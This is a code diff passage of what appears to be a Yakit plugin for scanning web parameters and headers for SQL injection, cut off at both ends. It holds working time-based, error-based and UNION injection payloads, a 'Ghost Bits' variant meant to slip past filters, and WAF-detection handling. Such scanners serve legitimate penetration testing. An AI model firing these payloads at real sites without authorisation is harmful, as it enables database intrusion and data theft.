+        "same number of columns",
+        "fewer columns",
+        "Invalid column name",
+
+        // Microsoft Access
+        "number of columns in the two selected tables or queries do not match",
+
+        // 通用短语（多数据库适用）
+        "invalid ORDER BY",
+        "ORDER BY clause",
+        "column count mismatch",
+        "invalid column index",
+
+        // 中文常见错误（根据之前整理）
+        "ORDER BY 子句中的未知列",
+        "ORDER BY 位置",
+        "ORDER BY 编号",
+        "超出了选择列表中项数的范围",
+        "ORDER BY 列号",
+        "ORDER BY 项必须是 SELECT 列表表达式的编号",
+        "联合查询中的两个选定表或查询中的列数不匹配",
+        "XPATH syntax error",
+        "~5.1.73-community",
+    ]
+
+
+    // === 交换插入模式处理 ===
+    if swapInsertMode {
+        println("⚙️ 已启用「交换插入模式」，将为每个检测组扩展互换模式的 payload")
+        for idx, group = range detectionGroups {
+            originalPayloads = group["payloads"]
+            if originalPayloads == nil || len(originalPayloads) == 0 {
+                continue
+            }
+            newPayloads = []
+            // 用于去重：记录已存在的 (value, mode) 组合
+            seen = make(map[string]bool)
+            for _, item = range originalPayloads {
+                value, mode = extractPayloadInfo(item)
+                key = sprintf("%s|%s", value, mode)
+                if seen[key] {
+                    continue
+                }
+                seen[key] = true
+                // 保留原 payload
+                newPayloads = append(newPayloads, item)
+                // 生成互换模式的 payload
+                swappedMode = "append"
+                if mode == "append" {
+                    swappedMode = "replace"
+                } else if mode == "replace" {
+                    swappedMode = "append"
+                }
+                swappedKey = sprintf("%s|%s", value, swappedMode)
+                if !seen[swappedKey] {
+                    if swappedMode == "append" {
+                        // append 模式可以直接用字符串表示
+                        newPayloads = append(newPayloads, value)
+                    } else {
+                        newPayloads = append(newPayloads, {"value": value, "mode": swappedMode})
+                    }
+                    seen[swappedKey] = true
+                }
+            }
+            detectionGroups[idx]["payloads"] = newPayloads
+            println(sprintf("  检测组「%s」: payload 数量从 %d 扩展至 %d", group["name"], len(originalPayloads), len(newPayloads)))
+        }
+    }
+
+
+
+
+    // ========== 新增：Ghost Bits 编码模式 ==========
+    if enableGhostBits {
+        println("👻 已启用「Ghost Bits 编码模式」，将为每个检测组生成汉字幽灵载荷...")
+        for idx, group = range detectionGroups {
+            originalPayloads = group["payloads"]
+            if originalPayloads == nil || len(originalPayloads) == 0 {
+                continue
+            }
+            newPayloads = []
+            seen = make(map[string]bool)
+            for _, item = range originalPayloads {
+                // 保留原始 payload
+                value, mode = extractPayloadInfo(item)
+                key = sprintf("%s|%s", value, mode)
+                if !seen[key] {
+                    newPayloads = append(newPayloads, item)
+                    seen[key] = true
+                }
+
+                // 生成 Ghost Bits 版本
+                ghostValue = toGhostBits(value)
+                if ghostValue != "" && ghostValue != value {
+                    ghostKey = sprintf("%s|%s", ghostValue, mode)
+                    if !seen[ghostKey] {
+                        if mode == "append" {
+                            // 字符串模式
+                            newPayloads = append(newPayloads, ghostValue)
+                        } else {
+                            // 对象模式（Yak 原生风格，不用 map[string]interface{}）
+                            newPayloads = append(newPayloads, {"value": ghostValue, "mode": mode})
+                        }
+                        seen[ghostKey] = true
+                    }
+                }
+            }
+            detectionGroups[idx]["payloads"] = newPayloads
+            println(sprintf("  检测组「%s」: Ghost Bits 扩展后 payload 数量: %d", group["name"], len(newPayloads)))
+        }
+    }
+
+
+
+
+    // === 创建并发控制 ===
+    wg = sync.NewSizedWaitGroup(maxConcurrent)
+
+    // === 对每个参数进行并发测试 ===
+    for _, currentParam = range params {
+        if currentParam == nil {
+            println("警告: 遇到空参数对象，跳过")
+            continue
+        }
+        
+        paramName = currentParam.Name()
+        paramNameLower = str.ToLower(paramName)
+        if paramNameLower in paramBlacklistMap {
+            println(sprintf("参数名黑名单命中，跳过参数: %s", paramName))
+            continue
+        }
+        
+        if notTestCookie && currentParam.IsCookieParams() {
+            println(sprintf("跳过Cookie参数: %s", paramName))
+            continue
+        }
+        
+        originalValue = currentParam.Value()
+        if type(originalValue) != "string" {
+            originalValue = sprintf("%v", originalValue)
+        }
+        originalValueLower = str.ToLower(originalValue)
+        if originalValueLower in paramValueBlacklistMap {
+            println(sprintf("参数值黑名单命中，跳过参数: %s (值: %s)", paramName, originalValue))
+            continue
+        }
+        
+        if len(originalValue) < minParamValueLength {
+            println(sprintf("参数值长度小于最小长度，跳过参数: %s (长度: %d)", paramName, len(originalValue)))
+            continue
+        }
+        
+        wg.Add()
+        
+        // 启动并发 goroutine 
+        go func(param) {
+            defer wg.Done()
+
+            paramName = param.Name()
+            originalValue = param.Value()
+            if type(originalValue) != "string" {
+                originalValue = sprintf("%v", originalValue)
+            }
+            println(sprintf("正在测试参数: %s, 原始值: %s", paramName, originalValue))
+
+            paramType = ""
+            if param.IsGetParams() {
+                paramType = "GET"
+            } else if param.IsPostParams() {
+                paramType = "POST"
+            } else if param.IsCookieParams() {
+                paramType = "COOKIE"
+            } else {
+                paramType = "OTHER"
+            }
+
+            // === MODIFIED START: 用于合并敏感信息泄露报告的对象（使用空对象字面量）===
+            sensitiveAlerts = make(map[string]any)
+            // === MODIFIED END ===
+
+            // 初始化滑动时间窗口，填入全局原始请求的时间样本
+            timeWindow := make([]int, 0, 10)
+            for _, t := range timeSamples {
+                if len(timeWindow) < 10 {
+                    timeWindow = append(timeWindow, t)
+                }
+            }
+
+
+            wafDetected = false
+            wafReported = false
+            for _, group = range detectionGroups {
+                // 如果开启了 stop-on-waf 且已经检测到 WAF，则跳出循环，停止该参数所有后续检测组
+                if stopOnWaf && wafDetected {
+                    println(sprintf("参数 [%s] 因检测到 WAF 且 stop-on-waf 开启，停止后续检测组", paramName))
+                    break
+                }
+                if group["type"] == "union" && !enableUnionDetection {
+                    continue
+                }
+
+                if len(group["payloads"]) == 0 {
+                    continue
+                }
+
+                println(sprintf("参数 [%s] 执行检测组: %s (%s)", paramName, group["name"], group["type"]))
+
+                responses = make(map[string]string)
+                similarities = make(map[string]float64)
+                responseTimes = make(map[string]int)
+
+                // FIX: 新增映射，用于存储每个payload对应的完整测试值
+                fullPayloadMap = make(map[string]string)
+
+                var fullPayload = ""
+
+                // === 修改为支持 payload 级插入模式的请求发送方式 ===
+                for _, payloadItem = range group["payloads"] {
+                    // 提取 payload 字符串和模式
+                    payloadStr, payloadMode = extractPayloadInfo(payloadItem)
+
+                    // 根据模式构造完整测试参数值
+                    if payloadMode == "replace" {
+                        fullPayload = payloadStr
+                    } else {
+                        fullPayload = originalValue + payloadStr
+                    }
+                    // FIX: 存储payloadStr对应的完整值
+                    fullPayloadMap[payloadStr] = fullPayload
+
+                    println(sprintf("参数 [%s] 测试载荷: %s (模式: %s)", paramName, fullPayload, payloadMode))
+
+                    testReqs, _ = param.Fuzz(fullPayload).Results()
+
+                for _, testRequest = range testReqs {
+                    // 随机延迟（如果启用）
+                    if (randomDelayMax > 0 && randomDelayMax > randomDelayMin) {
+                            delay := randn(randomDelayMin, randomDelayMax)
+                            if (delay > 0) {
+                                time.Sleep(float64(delay) / 1000.0)
+                            }
+                        }
+
+                    // 使用 fuzz 发送测试请求，支持超时和重试
+                    // testFuzzer, err := fuzz.HTTPRequest(testRequest, fuzz.https(isHttps))
+                    // testFuzzer, err := fuzz.HTTPRequest(testRequest, 
+                    // fuzz.https(isHttps),
+                    // fuzz.proxy(proxy1)
+                    // )
+                    testFuzzer, err := createFuzzerWithProxy(testRequest, isHttps, proxy1)
+                    if err != nil {
+                        println(sprintf("创建测试请求的fuzzer失败: %v", err))
+                        continue
+}
+                    
+                    testResp, reqErr := executeWithRetry(testFuzzer, httpTimeout)
+                    if reqErr != nil {
+                        println(sprintf("测试请求失败（重试后）: %v, payload=%s", reqErr, payloadStr))
+                        continue
+                    }
+
+                    // 基础响应信息
+                    responseTime = testResp.ServerDurationMs
+                    testBody = string(testResp.LowhttpResponse.GetBody())
+
+                    // 获取响应状态码（从 LowhttpResponse 调用 GetStatusCode()）
+                    statusCode = 0
+                    if testResp.LowhttpResponse != nil {
+                        statusCode = testResp.LowhttpResponse.GetStatusCode()
+                    }
+
+                    // 获取请求 URL（从 testRequest 对象获取完整 URL）
+                    requestURL = ""
+                    if testRequest != nil && testRequest.URL != nil {
+                        requestURL = testRequest.URL.String()
+                    } else {
+                        requestURL = url // 备用，可能不含修改后的参数
+                    }
+
+                    // WAF 检测
+                    wafBlocked = isWAFResponse(testBody)
+
+                    // 初始化相似度和错误关键字
+                    similarity = 0.0
+                    matchedKeyword = ""
+
+                    // 如果不是 WAF 拦截，计算相似度和检测错误关键字
+                    cleanedTestBody := cleanDynamicContent(testBody)
+                    if !wafBlocked {
+                        similarity, simErr = str.CalcTextMaxSubStrStability(cleanedOriginalBody, cleanedTestBody)
+                        if simErr != nil {
+                            println(sprintf("计算相似度失败: %v, payload=%s", simErr, payloadStr))
+                            similarity = 0.0
+                        }
+
+                        lowerTestBody = str.ToLower(testBody)
+                        for _, keyword = range sensitiveKeywords {
+                            if str.Contains(lowerTestBody, str.ToLower(keyword)) {
+                                matchedKeyword = keyword
+                                break
+                            }
+                        }
+                    }
+                    responses[payloadStr] = cleanedTestBody   // 存储清洗后的，供 payload 间相似度对比
+
+                    // ========== 插入流量统计表格（如果启用）==========
+                        seqLock.Lock()
+                        rowSeq++
+                        currentSeq := rowSeq
+                        seqLock.Unlock()
+
+                        tableLock.Lock()
+                        yakit.TableData("SQL注入测试流量", {
+                            "序号":           currentSeq,
+                            "参数名":         paramName,
+                            "原始值":         originalValue,
+                            "测试payload":    payloadStr,
+                            "完整测试值":     paramName + "=" + fullPayload,
+                            "检测组":         group["name"],
+                            "请求URL":        requestURL,
+                            "响应状态码":     statusCode,
+                            "响应大小(bytes)": len(testBody),
+                            "响应时间(ms)":   responseTime,
+                            "相似度(与原始)": similarity,
+                            "是否WAF拦截":    wafBlocked ? "是" : "否"
+                        })
+                        tableLock.Unlock()
+
+                    // 如果被 WAF 拦截，跳过后续处理（但已记录表格）
+                    if wafBlocked {
+                        // 如果尚未上报 WAF 风险，则上报一次
+                        if !wafReported {
+                            // 获取请求 URL
+                            requestURL = ""
+                            if testRequest != nil && testRequest.URL != nil {
+                                requestURL = testRequest.URL.String()
+                            } else {
+                                requestURL = url
+                            }
+
+                            risk.NewRisk(
+                                host,  // 主机名（外部闭包变量，可用）
+                                risk.title(sprintf("WAF拦截: 参数 %s 被防火墙拦截 (%s)", paramName, group["name"])),
+                                risk.severity("info"),
+                                risk.parameter(paramName),
+                                risk.payload(payloadStr),
+                                risk.description(sprintf("请求被 Web 应用防火墙拦截，可能触发安全规则。URL: %s", requestURL)),
+                                risk.solution("检查 payload 是否触发 WAF，或调整测试策略。"),
+                                risk.typeVerbose("waf-intercept"),
+                                risk.request(testResp.RawRequest),
+                                risk.response(testResp.RawPacket),
+                                risk.details({
+                                    "detection_group": group["name"],
+                                    "param_name": paramName,
+                                    "param_type": paramType,
+                                    "original_value": originalValue,
+                                    "payload": payloadStr,
+                                    "response_time_ms": responseTime,
+                                    "waf_keyword_matched": "检测到WAF特征"
+                                })
+                            )
+                            wafReported = true
+                        }
+                        wafDetected = true
+                        println(sprintf("检测到 WAF 拦截页面，跳过 payload: %s", payloadStr))
+                        break  // 跳出当前 payload 循环
+                    }
+
+                    // 记录响应数据供后续分析（原逻辑保留）
+                    responseTimes[payloadStr] = responseTime
+                    similarities[payloadStr] = similarity
+
+                    // 更新滑动窗口（仅非时间组，且排除异常长响应）
+                    if group["type"] != "time" && responseTime > 0 && responseTime < 30000 {
+                        if len(timeWindow) >= 10 {
+                            timeWindow = timeWindow[1:]   // 保持固定大小
+                        }
+                        timeWindow = append(timeWindow, responseTime)
+                    }
+
+
+
+
+                    // 敏感关键字收集（原逻辑）
+                    lowerTestBody = str.ToLower(testBody)
+                    for _, keyword = range sensitiveKeywords {
+                        if str.Contains(lowerTestBody, str.ToLower(keyword)) {
+                            alertKey = sprintf("%s:%s", paramName, keyword)
+                            fullPayloadActual = fullPayloadMap[payloadStr]
+
+                            keywordPos = str.Index(lowerTestBody, str.ToLower(keyword))
+                            startPos = keywordPos - 40
+                            if startPos < 0 { startPos = 0 }
+                            endPos = keywordPos + len(keyword) + 40
+                            if endPos > len(testBody) { endPos = len(testBody) }
+                            contextStr = substring(testBody, startPos, endPos)
+
+                            entry = sensitiveAlerts[alertKey]
+                            if entry == nil {
+                                entry = make(map[string]any)
+                                entry["payloads"] = []
+                                entry["contexts"] = []
+                                entry["groups"]   = []
+                                entry["sims"]     = []
+                                entry["times"]    = []
+                            }
+                            entry["payloads"] = append(entry["payloads"], fullPayloadActual)
+                            entry["contexts"] = append(entry["contexts"], contextStr)
+                            entry["groups"]   = append(entry["groups"], group["name"])
+                            entry["sims"]     = append(entry["sims"], similarity)
+                            entry["times"]    = append(entry["times"], responseTime)
+                            sensitiveAlerts[alertKey] = entry
+
+                            break // 每个 payload 只记录第一个匹配的关键字
+                        }
+                    }
+
+                    break // 每个载荷只测试第一个请求
+                }
+                }
+
+                // 计算载荷之间的相似度
+                for _, condition = range group["conditions"] {
+                    if condition["compareWith"] != "original" {
+                        comparePayload = condition["compareWith"]
+                        targetPayload = condition["payload"]
+
+                        if responses[comparePayload] != nil && responses[targetPayload] != nil {
+                            similarity, simErr = str.CalcTextMaxSubStrStability(responses[comparePayload], responses[targetPayload])
+                            if simErr == nil {
+                                similarities[targetPayload + "_vs_" + comparePayload] = similarity
+                                println(sprintf("参数 [%s] %s 与 %s 相似度: %f", paramName, targetPayload, comparePayload, similarity))
+                            }
+                        }
+                    }
+                }
+
+                // 定义 conditionResults (用于风险详情)
+                conditionResults = make(map[string]bool)
+
+                // FIX: 新增数组，记录所有满足条件的payload
+                satisfiedPayloads = []
+
+                // ========== 修改开始：根据组自定义逻辑决定判定逻辑 ==========
+                conditionResults = make(map[string]bool)
+                satisfiedPayloads = []   // 记录所有满足条件的payload
+                isVulnerable = false     // 默认无漏洞
+
+                // 获取该组的判定逻辑，若未设置则根据 type 提供默认值
+                logic = group["logic"]
+                if logic == nil {
+                    if group["type"] == "time" {
+                        logic = "any"
+                    } else {
+                        logic = "all"
+                    }
+                }
+
+                if logic == "any" {
+                    // 任一条件满足即可
+                    for _, condition = range group["conditions"] {
+                        conditionPassed := false
+                        payload = condition["payload"]
+                        compareWith = condition["compareWith"]
+                        
+                        // 动态计算当前阈值
+                        currentThreshold = calculateThreshold(condition, group, similarityThresholdFactor, baselineSimilarity)
+                        
+                        // 1. 先判断本条件是否使用动态阈值
+                        useDynamicThreshold := false
+                        if group["type"] == "time" {
+                            // time 组默认使用动态阈值，除非显式关闭
+                            if condition["useDynamicThreshold"] == nil || condition["useDynamicThreshold"] != false {
+                                useDynamicThreshold = true
+                            }
+                        } else if condition["useDynamicThreshold"] == true {
+                            // 非 time 组可显式开启
+                            useDynamicThreshold = true
+                        }
+
+                        // 2. 是否检查时间：任何情况只要开启动态阈值或组原本就启用了时间检查
+                        shouldCheckTime := group["type"] == "time" || group["enableTimeCheck"] == true || useDynamicThreshold
+
+                        thresholdOperator = condition["thresholdOperator"]
+                        // 仅在时间组才读取时间阈值字段，否则使用无影响的默认值
+                        timeThreshold = 0
+                        timeThresholdOperator = "<"
+                        if shouldCheckTime {
+                            timeThreshold = condition["timeThreshold"]
+                            timeThresholdOperator = condition["timeThresholdOperator"]
+                        }
+
+
+
+
+
+                        // 若为时间盲注组，用滑动窗口计算动态阈值
+                        if useDynamicThreshold && shouldCheckTime && len(timeWindow) > 0 {
+                            if len(timeWindow) > 0 {
+                                // 计算均值
+                                sum := 0
+                                for _, t := range timeWindow {
+                                    sum += t
+                                }
+                                avg := float64(sum) / float64(len(timeWindow))
+                                // 计算标准差
+                                sumSq := 0.0
+                                for _, t := range timeWindow {
+                                    diffVal := float64(t) - avg
+                                    sumSq += diffVal * diffVal
+                                }
+                                std := math.Sqrt(sumSq / float64(len(timeWindow)))
+
+                                // 偏移量取 3倍标准差 与 3000 中的较大值
+                                offset := std * 3
+                                if offset < 3000 {
+                                    offset = 3000
+                                }
+                                dynamicThreshold := int(avg + offset)
+                                if dynamicThreshold < 4000 {
+                                    dynamicThreshold = 4000
+                                }
+                                timeThreshold = dynamicThreshold
+                            } else {
+                                timeThreshold = 4000
+                            }
+                        }
+
+
+
+
+                        similarityKey = payload
+                        if compareWith != "original" {
+                            similarityKey = payload + "_vs_" + compareWith
+                        }
+
+                        similarity = similarities[similarityKey]
+                        if similarity == nil {
+                            println(sprintf("警告: 未找到相似度值 for key: %s, 跳过此条件", similarityKey))
+                            continue
+                        }
+
+                        responseTime = responseTimes[payload]
+                        if responseTime == nil {
+                            println(sprintf("警告: 未找到响应时间 for payload: %s, 跳过此条件", payload))
+                            continue
+                        }
+
+                        responseTimeInt = int(responseTime)
+
+                        similarityMet = false
+                        if thresholdOperator == "<" {
+                            similarityMet = similarity < currentThreshold
+                        } else if thresholdOperator == ">" {
+                            similarityMet = similarity > currentThreshold
+                        } else if thresholdOperator == "=" {
+                            similarityMet = similarity == currentThreshold
+                        }
+
+                        timeMet = true   // 默认通过，非时间组直接 true
+                        if shouldCheckTime {
+                            if timeThresholdOperator == "<" {
+                                timeMet = responseTimeInt < timeThreshold
+                            } else if timeThresholdOperator == ">" {
+                                timeMet = responseTimeInt > timeThreshold
+                            } else if timeThresholdOperator == "=" {
+                                timeMet = responseTimeInt == timeThreshold
+                            }
+                        }
+
+                        // 时间组忽略相似度，仅用时间判断
+                        if group["type"] == "time" {
+                            conditionPassed = timeMet
+                        } else {
+                            conditionPassed = similarityMet && timeMet
+                        }
+                        conditionResults[payload + "_similarity"] = similarityMet
+                        conditionResults[payload + "_time"] = timeMet
+
+                        println(sprintf("条件检查: payload=%s, similarity=%f, currentThreshold=%f, similarityMet=%v, responseTime=%d, timeMet=%v, conditionPassed=%v",
+                            payload, similarity, currentThreshold, similarityMet, responseTimeInt, timeMet, conditionPassed))
+
+                        if conditionPassed {
+                            satisfiedPayloads = append(satisfiedPayloads, payload)
+                            isVulnerable = true
+                            break
+                        }
+                    }
+                } else { // logic == "all"
+                    // 所有条件必须满足
+                    isVulnerable = true
+                    for _, condition = range group["conditions"] {
+                        conditionPassed := false
+                        payload = condition["payload"]
+                        compareWith = condition["compareWith"]
+                        
+                        // 动态计算当前阈值
+                        currentThreshold = calculateThreshold(condition, group, similarityThresholdFactor, baselineSimilarity)
+                        
+                        // 1. 先判断本条件是否使用动态阈值
+                        useDynamicThreshold := false
+                        if group["type"] == "time" {
+                            // time 组默认使用动态阈值，除非显式关闭
+                            if condition["useDynamicThreshold"] == nil || condition["useDynamicThreshold"] != false {
+                                useDynamicThreshold = true
+                            }
+                        } else if condition["useDynamicThreshold"] == true {
+                            // 非 time 组可显式开启
+                            useDynamicThreshold = true
+                        }
+
+                        // 2. 是否检查时间：任何情况只要开启动态阈值或组原本就启用了时间检查
+                        shouldCheckTime := group["type"] == "time" || group["enableTimeCheck"] == true || useDynamicThreshold
+
+                        thresholdOperator = condition["thresholdOperator"]
+                        // 仅在时间组才读取时间阈值字段，否则使用无影响的默认值
+                        timeThreshold = 0
+                        timeThresholdOperator = "<"
+                        if shouldCheckTime {
+                            timeThreshold = condition["timeThreshold"]
+                            timeThresholdOperator = condition["timeThresholdOperator"]
+                        }
+
+
+
+
+                        similarityKey = payload
+                        if compareWith != "original" {
+                            similarityKey = payload + "_vs_" + compareWith
+                        }
+
+                        similarity = similarities[similarityKey]
+                        if similarity == nil {
+                            println(sprintf("警告: 未找到相似度值 for key: %s, 此条件不满足", similarityKey))
+                            isVulnerable = false
+                            break
+                        }
+
+                        responseTime = responseTimes[payload]
+                        if responseTime == nil {
+                            println(sprintf("警告: 未找到响应时间 for payload: %s, 此条件不满足", payload))
+                            isVulnerable = false
+                            break
+                        }
+
+                        responseTimeInt = int(responseTime)
+
+                        similarityMet = false
+                        if thresholdOperator == "<" {
+                            similarityMet = similarity < currentThreshold
+                        } else if thresholdOperator == ">" {
+                            similarityMet = similarity > currentThreshold
+                        } else if thresholdOperator == "=" {
+                            similarityMet = similarity == currentThreshold
+                        }
+
+                        timeMet = true
+                        if shouldCheckTime {
+                            if timeThresholdOperator == "<" {
+                                timeMet = responseTimeInt < timeThreshold
+                            } else if timeThresholdOperator == ">" {
+                                timeMet = responseTimeInt > timeThreshold
+                            } else if timeThresholdOperator == "=" {
+                                timeMet = responseTimeInt == timeThreshold
+                            }
+                        }
+
+                        // 时间组忽略相似度，仅用时间判断
+                        if group["type"] == "time" {
+                            conditionPassed = timeMet
+                        } else {
+                            conditionPassed = similarityMet && timeMet
+                        }
+                        conditionResults[payload + "_similarity"] = similarityMet
+                        conditionResults[payload + "_time"] = timeMet
+
+                        println(sprintf("条件检查: payload=%s, similarity=%f, currentThreshold=%f, similarityMet=%v, responseTime=%d, timeMet=%v, conditionPassed=%v",
+                            payload, similarity, currentThreshold, similarityMet, responseTimeInt, timeMet, conditionPassed))
+
+                        if conditionPassed {
+                            satisfiedPayloads = append(satisfiedPayloads, payload)
+                        }
+
+                        if !conditionPassed {
+                            isVulnerable = false
+                            break
+                        }
+                    }
+
+                    // 如果 conditions 为空，则无漏洞
+                    if len(group["conditions"]) == 0 {
+                        isVulnerable = false
+                    }
+                }
+                // ========== 修改结束 ==========
+
+
+                if isVulnerable {
+                    // FIX: 确定用于报告的payload及其完整值
+                    vulnerablePayload = ""
+                    if len(satisfiedPayloads) > 0 {
+                        vulnerablePayload = satisfiedPayloads[0]   // 取第一个满足条件的payload
+                    } else {
+                        // 理论上不会进入这里，但作为fallback
+                        firstItem = group["payloads"][0]
+                        if type(firstItem) == "string" {
+                            vulnerablePayload = firstItem
+                        } else {
+                            vulnerablePayload = firstItem["value"]
+                        }
+                    }
+                    vulnerableFullPayload = fullPayloadMap[vulnerablePayload]
+                    if vulnerableFullPayload == "" {
+                        vulnerableFullPayload = vulnerablePayload // 最后的保底
+                    }
+
+                    println(sprintf("🎯 参数 [%s] 检测组 %s 检测到SQL注入漏洞! (触发payload: %s)", paramName, group["name"], vulnerablePayload))
+
+                    // ========== 构建 payload_metrics 列表（曲线数据）==========
+                    payloadMetrics = []
+                    for _, payloadItem = range group["payloads"] {
+                        payloadStr, payloadMode = extractPayloadInfo(payloadItem)
+                        fullPayload = fullPayloadMap[payloadStr]
+                        
+                        // 获取相似度和响应时间（如果 map 中没有该 payload 的键，则取默认值 0）
+                        similarity = similarities[payloadStr]
+                        if similarity == nil {
+                            similarity = 0.0
+                        }
+                        responseTime = responseTimes[payloadStr]
+                        if responseTime == nil {
+                            responseTime = 0
+                        }
+                        
+                        // 检查该 payload 是否满足条件（即被判定为触发漏洞的 payload 之一）
+                        isSatisfied = false
+                        for _, sp = range satisfiedPayloads {
+                            if sp == payloadStr {
+                                isSatisfied = true
+                                break
+                            }
+                        }
+                        
+                        metric = {
+                            "payload": payloadStr,
+                            "mode": payloadMode,
+                            "full_payload": fullPayload,
+                            "similarity": similarity,
+                            "response_time_ms": responseTime,
+                            "is_satisfied": isSatisfied
+                        }
+                        payloadMetrics = append(payloadMetrics, metric)
+                    }
+
+                    // 重新发送请求以获取证据
+                    testReqs, _ = param.Fuzz(vulnerableFullPayload).Results()
+
+                    if len(testReqs) == 0 {
+                        println(sprintf("构造报告请求失败: 结果为空"))
+                        continue
+                    }
+
+                    testResp, _, reqErr = poc.HTTPEx(testReqs[0], poc.https(isHttps))
+                    if reqErr != nil {
+                        println(sprintf("发送报告请求失败: %v", reqErr))
+                        continue
+                    }
+                    if testResp == nil {
+                        println("报告请求响应为空")
+                        continue
+                    }
+
+                    reqIns, err1 = poc.ParseBytesToHTTPRequest(testResp.RawRequest)
+                    if err1 != nil {
+                        println(sprintf("解析请求失败: %v", err1))
+                        continue
+                    }
+
+                    rspIns, err2 = poc.ParseBytesToHTTPResponse(testResp.RawPacket)
+                    if err2 != nil {
+                        println(sprintf("解析响应失败: %v", err2))
+                        continue
+                    }
+
+                    riskDetails = {
+                        "detection_group": group["name"],
+                        "group_type": group["type"],
+                        "original_value": originalValue,
+                        "similarities": similarities,
+                        "response_times": responseTimes,
+                        "condition_results": conditionResults,
+                        "satisfied_payloads": satisfiedPayloads, // FIX: 添加满足条件的payload列表
+                        "param_type": paramType,
+                        "param_position": param.PositionVerbose(),
+                        "detection_method": "multi_payload_analysis",
+                        "similarity_threshold_factor": similarityThresholdFactor,
+                        "threshold_adjusted": true,
+                        "database_type_hint": detectDatabaseTypeFromPayloads(group["payloads"]),
+                        "payload_metrics": payloadMetrics
+                    }
+
+                    risk.NewRisk(
+                        reqIns.URL.Host,
+                        risk.title(sprintf("SQL注入 (%s): %s", group["name"], reqIns.URL.String())),
+                        risk.severity("critical"),
+                        risk.parameter(paramName),
+                        risk.payload(vulnerableFullPayload),   // FIX: 使用正确的完整payload
+                        risk.description(group["description"]),
+                        risk.solution("使用参数化查询或预编译语句，对用户输入进行严格过滤和转义"),
+                        risk.typeVerbose("sql-injection"),
+                        risk.request(testResp.RawRequest),
+                        risk.type("sqlinjection"),
+                        risk.response(testResp.RawPacket),
+                        risk.details(riskDetails)
+                    )
+
+                    println(sprintf("已报告漏洞: 参数 %s, 载荷 %s", paramName, vulnerableFullPayload))
+                } else {
+                    println(sprintf("参数 [%s] 检测组 %s 未检测到漏洞", paramName, group["name"]))
+                }
+            }
+
+            // === MODIFIED START: 合并上报敏感信息泄露 ===
+            for alertKey, entry = range sensitiveAlerts {
+                // 从 key 中分离出参数名和关键字
+                parts = str.Split(alertKey, ":")
+                if len(parts) != 2 { continue }
+                paramNameKey = parts[0]
+                keyword = parts[1]
+
+                // 合并 payload 显示（用 " | " 连接）
+                mergedPayloads = str.Join(entry["payloads"], " | ")
+
+                // 上下文取第一个
+                firstContext = entry["contexts"][0]
+
+                // 构建合并后的详情
+                mergedDetails = {
+                    "merged_payloads":    entry["payloads"],        // 原始列表
+                    "merged_contexts":    entry["contexts"],
+                    "trigger_groups":     entry["groups"],
+                    "similarities":       entry["sims"],
+                    "response_times_ms":  entry["times"],
+                    "param_type":         paramType,
+                    "param_position":     param.PositionVerbose(),
+                    "database_type":      detectDatabaseType(keyword),
+                }
+
+                // 上报合并后的风险
+                risk.NewRisk(
+                    host,
+                    risk.title(sprintf("敏感信息泄露: 检测到SQL关键字 '%s'", keyword)),
+                    risk.severity("info"),
+                    risk.parameter(paramNameKey),
+                    risk.payload(mergedPayloads),   // 合并后的 payload 字符串
+                    risk.description("响应中包含敏感SQL关键字，可能导致信息泄露（已合并多个触发点）"),
+                    risk.solution("对用户输入进行严格过滤和转义，避免在响应中返回敏感信息"),
+                    risk.typeVerbose("sensitive-info-leakage"),
+                    risk.details(mergedDetails),
+                )
+
+                println(sprintf("已合并上报敏感信息: 参数 %s, 关键字 %s, 共 %d 个 payload", paramNameKey, keyword, len(entry["payloads"])))
+            }
+            // === MODIFIED END ===
+
+            // === Header注入检测（保持不变）===
+            if enableHeaderInjection {
+                testHeaders = ["Referer", "X-Forwarded-For", "X-Real-IP", "X-Forwarded-Host", "User-Agent"]
+                headers = freq.GetHeaderParams()
+
+                existingHeaders = make(map[string]string)
+                for h in headers {
+                    if h.Name() in testHeaders {
+                        existingHeaders[h.Name()] = h.ValueString()
+                    }
+                }
+
+                for headerName in testHeaders {
+                    timePayloads = [
+                        "' AND SLEEP(5)--",
+                        "'; WAITFOR DELAY '0:0:3'--",
+                        "' AND pg_sleep(5)--",
+                        "' AND updatexml(1,concat(0x7e,version(),0x7e),1)--",
+                        "' AND extractvalue(1,concat(0x7e,version(),0x7e))--",
+                        "' UNION SELECT NULL--",
+                        "' UNION SELECT 1,2,3--"
+                    ]
+
+                    for payload in timePayloads {
+                        testValue = ""
+
+                        if existingHeaders[headerName] != nil && existingHeaders[headerName] != "" {
+                            testValue = sprintf("%s%s", existingHeaders[headerName], payload)
+                        } else {
+                            if headerName == "Referer" {
+                                testValue = sprintf("%s%s", url, payload)
+                            } else if headerName == "X-Forwarded-For" || headerName == "X-Real-IP" {
+                                randomIP = sprintf("%d.%d.%d.%d", randn(1, 254), randn(1, 254), randn(1, 254), randn(1, 254))
+                                testValue = sprintf("%s%s", randomIP, payload)
+                            } else {
+                                testValue = payload
+                            }
+                        }
+
+                        if randomDelayMax > 0 {
+                            delay := randn(randomDelayMin, randomDelayMax)
+                            dur, _ := time.ParseDuration(sprintf("%dms", delay))
+                            time.Sleep(dur)
+                        }
+                        // resu, err := freq.FuzzHTTPHeader(headerName, testValue).ExecFirst(
+                        //     fuzz.WithTimeOut(10),
+                        //     fuzz.proxy(proxy1)   // 已修正
+                        // )
+                        // 获取原始请求的深拷贝（避免修改原请求）
+                        testReq = freq.OriginRequest
+                        // 设置要测试的 Header
+                        testReq.Header.Set(headerName, testValue)
+
+                        // 创建带代理的 fuzzer
+                        testFuzzer, err := createFuzzerWithProxy(testReq, isHttps, proxy1)
+                        if err != nil {
+                            println(sprintf("创建 Header 测试 fuzzer 失败: %v", err))
+                            continue
+                        }
+                        resu, err := testFuzzer.ExecFirst(fuzz.WithTimeOut(httpTimeout))
+                        if err != nil {
+                            continue
+                        }
+
+                        if err != nil { continue }
+
+                        if resu.ServerDurationMs >= 4000 && resu.ServerDurationMs <= 10000 {
+                            delayPayload = str.Replace(payload, "3", "5", 1)
+                            delayTestValue = ""
+
+                            if existingHeaders[headerName] != nil && existingHeaders[headerName] != "" {
+                                delayTestValue = sprintf("%s%s", existingHeaders[headerName], delayPayload)
+                            } else {
+                                if headerName == "Referer" {
+                                    delayTestValue = sprintf("%s%s", url, delayPayload)
+                                } else if headerName == "X-Forwarded-For" || headerName == "X-Real-IP" {
+                                    randomIP = sprintf("%d.%d.%d.%d", randn(1, 254), randn(1, 254), randn(1, 254), randn(1, 254))
+                                    delayTestValue = sprintf("%s%s", randomIP, delayPayload)
+                                } else {
+                                    delayTestValue = delayPayload
+                                }
+                            }
+
+                            // 随机延迟（如果启用）
